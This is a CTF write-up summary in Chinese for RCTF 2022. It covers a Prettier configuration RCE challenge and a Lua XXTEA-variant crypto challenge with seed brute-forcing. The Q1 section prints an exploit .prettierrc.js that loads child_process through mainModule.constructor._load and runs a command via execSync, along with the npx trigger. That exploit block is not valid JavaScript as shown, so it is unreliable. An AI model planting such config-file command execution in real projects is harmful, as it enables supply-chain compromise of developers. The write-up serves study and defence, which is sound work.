---
title: 2022 RCTF WriteUp by Venom
contest: RCTF 2022
year: 2022
difficulty: medium
vuln_type: [rce, crypto_oracle]
tags: [Prettier, RCE, prettierrc.js, parser, child_process, _load, mainModule, constructor, Lua, TEA, XXTEA, bxor, srand, math.random]
attack_chain: ["Prettier RCE: 写 .prettierrc.js 配置 parser 字段", "parser 触发: module.exports = function babel(text, parsers, opts) { return text + flag }", "flag = exec('/readflag') 通过 global.process.mainModule.constructor._load 拿 child_process.execSync", "Crypto Lua: 8 轮 XXTEA 变种 sum=0xB8 delta=0x37", "b = { key[0], key[1], key[2], key[3] }", "strDecrypt(s, k) 按 2 字符一组解密", "math.random(33, 126) 生成 4 字符密码 srand 爆破", "Decrypt() 调 strDecrypt 拿 flag"]
key_payload: "parser = .prettierrc + _load('child_process').execSync('/readflag')"
one_liner: Prettier .prettierrc.js RCE + Lua XXTEA 变种 + srand 爆破
lesson: Prettier 配置 RCE 是 npm 供应链攻击典型；Lua TEA 变种是 reverse/crypto 入门
quality: high
---

# 2022 RCTF WriteUp by Venom

原文 https://www.ctfiot.com/85431.html （ChaMd5 Venom）

## Q1: Prettier RCE

**Prettier 配置加载顺序：**
1. `package.json` 的 "prettier" 字段
2. `.prettierrc` JSON/YAML
3. `.prettierrc.json` / `.yml` / `.yaml` / `.json5`
4. `.prettierrc.js` / `.cjs` / `prettier.config.js` / `.cjs`  → **可执行 JS**

**Exploit .prettierrc.js:**
```js
{
  trailingComma: "es5",
  tabWidth: 4,
  semi: false,
  singleQuote: true,
  parser: ".prettierrc",
  d: var load = global.process.mainModule.constructor._load,
  a: function exec(cmd){return load('child_process').execSync(cmd).toString()},
  b: var flag = exec("/readflag"),
  p1: function babel(text, parsers, opts = {}) { return text + flag },
  p2: module.exports = babel
}
```

**触发：**
```bash
# 任意 .js 文件用 prettier 格式化
npx prettier --config .prettierrc.js <some-file>
# 或 IDE 自动格式化
```

**机制：**
- `global.process.mainModule.constructor._load` = `require`（绕沙箱）
- `require('child_process').execSync('/readflag')` 同步执行
- Prettier 把 `parser` 字段当函数执行（plugin 系统）
- `flag` 拼接进格式化结果

## Q2: Crypto Lua XXTEA 变种

```lua
function to8(n) return n % 256 end
function bxor(a, b)
    local p = 0
    for i = 0, 7 do
        p = p + 2^i * ((a % 2 + b % 2) % 2)
        a = math.floor(a / 2)
        b = math.floor(b / 2)
        if a == 0 and b == 0 then break end
    end
    return p
end

function decrypt(v, k)
    local sum = 0xB8
    local delta = 0x37
    for i = 1, 8 do
        v[2] = to8(v[2] - to8(bxor(bxor(to8((v[1] * 16) + k[3]), to8(v[1] + sum)), to8(math.floor(v[1] / 32) + k[4]))))
        v[1] = to8(v[1] - to8(bxor(bxor(to8((v[2] * 16) + k[1]), to8(v[2] + sum)), to8(math.floor(v[2] / 32) + k[2]))))
        sum = sum - delta
    end
end
```

**变种 XXTEA 特征：**
- 8 轮（标准 32）
- sum=0xB8（标准 0xC6EF3720）
- delta=0x37（标准 0x9E3779B9）
- `* 16` 移位（标准 `<< 4`）
- `/ 32` 右移（标准 `>> 5`）
- 全部 mod 256

**passGen:**
```lua
function passGen()
    local pw = ""
    for i = 1, 4 do
        local j = math.random(33, 126)
        if j == 96 then pw = pw .. "_"
        else pw = pw .. string.char(j) end
    end
    return pw
end
```
- `math.random` 用 srand 设置种子可爆破
- 4 字符密码 [a-zA-Z0-9!@...] 

## 教学价值
- **Prettier / ESLint 等 JS 工具** 是 npm 供应链攻击面
- 配置 plugin/parser 可执行任意 JS
- **srand 爆破** 是 reverse 入门
- **Lua TEA 变种** 8 轮短 key 容易识别
- **bxor 实现** 用 8 次循环 + 移位模拟
- RCTF 是国内大型 CTF（杭电 r3kapig 团队办）

## 防御
- 禁用 Prettier 自定义 plugin
- ESLint 用 ESLint config 沙箱
- 不信任项目目录的 config
- 启用 code-signing

## 工具
- Prettier CLI
- Lua 5.1+ 解释器
- cryptii / CyberChef 验证
- srand 种子爆破脚本
